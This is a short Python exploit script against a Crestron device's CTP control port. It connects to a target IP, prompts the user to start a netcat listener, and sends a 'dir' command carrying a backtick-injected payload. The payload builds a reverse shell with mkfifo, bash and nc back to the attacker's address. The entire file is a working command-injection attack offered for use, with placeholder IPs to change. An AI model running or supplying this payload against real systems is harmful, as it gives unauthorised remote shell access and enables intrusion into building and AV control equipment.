#!/usr/bin/env python3

import socket
import sys

CRESTRON_IP   = '10.10.10.200' # Target IP
CRESTRON_PORT = 41795          # CTP port (basically telnet)
LOCAL_PORT    = 4444           # Change as needed
LOCAL_IP      = '10.10.10.2'   # Also change as needed

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(1)
s.connect((CRESTRON_IP, CRESTRON_PORT))

print(f'debug: {s.recv(1024).decode()}')
print(f'\nOpen your listener now in another shell, e.g.:')
print(f'\nncat -nklvp {LOCAL_PORT}\n\nor')
print(f'\nnc -nvl {LOCAL_PORT}')

input(f'\nPress enter to continue...\n')

s.send(f'dir `rm f;busybox mkfifo f;cat f|bash -i 2>&1|nc {LOCAL_IP} {LOCAL_PORT} >f`\r\n'.encode())
print(f'debug: {s.recv(1024).decode()}')
